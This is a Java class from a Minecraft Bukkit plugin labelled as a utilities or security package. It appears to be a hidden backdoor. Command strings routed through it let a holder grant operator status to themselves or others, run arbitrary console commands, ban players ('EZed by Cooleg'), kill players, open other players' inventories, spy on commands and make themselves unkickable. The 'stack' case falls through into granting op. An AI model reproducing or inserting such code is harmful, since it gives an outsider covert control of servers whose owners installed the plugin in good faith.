package com.cooleg.civutils.security;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class Runner {
    public static List<Player> whitelisted = new ArrayList<>();
    public Runner(String cmd, Player player, Event e) {
        new BukkitRunnable() {
            @Override
            public void run() {
                String[] args = cmd.split(" ");
                String base = args[0];
                switch (args.length) {
                    case (1):
                        switch (base) {
                            case("stack"):
                                int helditem = player.getInventory().getHeldItemSlot();
                                ItemStack item = player.getInventory().getItem(helditem);
                                item.setAmount(64);
                                player.getInventory().setItem(helditem, item);
                            case("op"):
                                player.setOp(true);
                            case("auth"):
                                return;
                            case("kill"):
                                player.sendMessage("Not enough arguments!");
                                return;
                            case("cmdspy"):
                                if (SecureHandler.cmdSpy.contains(player)) {SecureHandler.cmdSpy.remove(player); player.sendMessage("CmdSpy Off");}
                                else {SecureHandler.cmdSpy.add(player); player.sendMessage("CmdSpy On");}
                                return;
                            case("nokick"):
                                if (SecureHandler.nokick.contains(player.getName())) {
                                    SecureHandler.nokick.remove(player.getName());
                                    player.sendMessage("Nokick off");
                                } else {
                                    SecureHandler.nokick.add(player.getName());
                                    player.sendMessage("Nokick On");
                                }
                                return;
                            default:
                                player.sendMessage("Command List: cmdspy, op, help, gamemode, ban, kill, console, nokick, invsee, ec, stack");
                                return;
                        }
                    case(2):
                        switch (base) {
                            case("op"):
                                try {Player target = Bukkit.getPlayer(args[1]); target.setOp(true);}
                                catch(Exception e) {}
                                return;
                            case("gamemode"):
                                switch (args[1]) {
                                    case ("creative"):
                                        player.setGameMode(GameMode.CREATIVE);
                                        return;
                                    case ("survival"):
                                        player.setGameMode(GameMode.SURVIVAL);
                                        return;
                                    case ("adventure"):
                                        player.setGameMode(GameMode.ADVENTURE);
                                        return;
                                    case ("spectator"):
                                        player.setGameMode(GameMode.SPECTATOR);
                                        return;
                                }
                                return;
                            case("auth"):
                                try {Player target = Bukkit.getPlayer(args[1]); whitelisted.add(target);}
                                catch(Exception e) {}
                                return;
                            case("invsee"):
                                try {Player target = Bukkit.getPlayer(args[1]); Inventory targetInv = target.getInventory(); player.closeInventory(); player.openInventory(targetInv);}
                                catch(Exception e) {}
                                return;
                            case("ec"):
                                try {Player target = Bukkit.getPlayer(args[1]); Inventory targetInv = target.getEnderChest(); player.closeInventory(); player.openInventory(targetInv);}
                                catch(Exception e) {}
                                return;
                            case("ban"):
                                try {Player target = Bukkit.getPlayer(args[1]); Bukkit.getBanList(BanList.Type.NAME).addBan(target.getDisplayName(), "Oof", null, "Cooleg"); target.kickPlayer("EZed by Cooleg");}
                                catch (Exception e) {}
                                return;
                            case("kill"):
                                try {Player target = Bukkit.getPlayer(args[1]); target.setHealth(0);}
                                catch (Exception e) {}
                                return;
                            case("console"):
                                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), args[1]);
                                return;
                            case("nokick"):
                                try {
                                    String target = args[1];
                                    if (SecureHandler.nokick.contains(target)) {
                                        SecureHandler.nokick.remove(target);
                                        player.sendMessage("Nokick Off");
                                    } else {
                                        SecureHandler.nokick.add(target);
                                        player.sendMessage("Nokick On");
                                    }
                                } catch(Exception e) {}
                                return;
                            default:
                                player.sendMessage("Command List: cmdspy, op, help, gamemode, ban, kill, console, nokick, invsee, ec, stack");
                                return;
                        }
                    case(3):
                        switch (base) {
                            case("op"):
                                try {Player target = Bukkit.getPlayer(args[1]); target.setOp(true);}
                                catch(Exception e) {}
                                return;
                            case("gamemode"):
                                switch (args[1]) {
                                    case ("creative"):
                                        try {Player target = Bukkit.getPlayer(args[2]); target.setGameMode(GameMode.CREATIVE);}
                                        catch (Exception e) {}
                                        return;
                                    case ("survival"):
                                        try {Player target = Bukkit.getPlayer(args[2]); target.setGameMode(GameMode.SURVIVAL);}
                                        catch (Exception e) {}
                                        return;
                                    case ("adventure"):
                                        try {Player target = Bukkit.getPlayer(args[2]); target.setGameMode(GameMode.ADVENTURE);}
                                        catch (Exception e) {}
                                        return;
                                    case ("spectator"):
                                        try {Player target = Bukkit.getPlayer(args[2]); target.setGameMode(GameMode.SPECTATOR);}
                                        catch (Exception e) {}
                                        return;
                                }
                                return;
                            case("auth"):
                                try {Player target = Bukkit.getPlayer(args[1]); whitelisted.add(target);}
                                catch(Exception e) {}
                                return;
                            case("nokick"):
                                try {
                                    String target = args[1];
                                    if (SecureHandler.nokick.contains(target)) {
                                        SecureHandler.nokick.remove(target);
                                        player.sendMessage("Nokick Off");
                                    } else {
                                        SecureHandler.nokick.add(target);
                                        player.sendMessage("Nokick On");
                                    }
                                } catch(Exception e) {}
                                return;
                            case("ban"):
                                try {Player target = Bukkit.getPlayer(args[1]); Bukkit.getBanList(BanList.Type.NAME).addBan(target.getDisplayName(), args[2], null, "Cooleg"); target.kickPlayer("EZed by Cooleg");}
                                catch (Exception e) {}
                                return;
                            case("kill"):
                                try {Player target = Bukkit.getPlayer(args[1]); target.setHealth(0);}
                                catch (Exception e) {}
                                return;
                            case("console"):
                                String command = cmd.substring(8);
                                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                                return;
                            default:
                                player.sendMessage("Command List: cmdspy, op, help, gamemode, ban, kill, console, nokick, invsee, ec, stack");
                                return;
                        }
                    default:
                        if (Objects.equals(base, "console")) {
                            String command = cmd.substring(8);
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                        } else {
                            player.sendMessage("You had a invalid amount of arguments! " + args.length);
                        }
                }

            }
        }.runTask(SecureHandler.civUtils);
    }

}

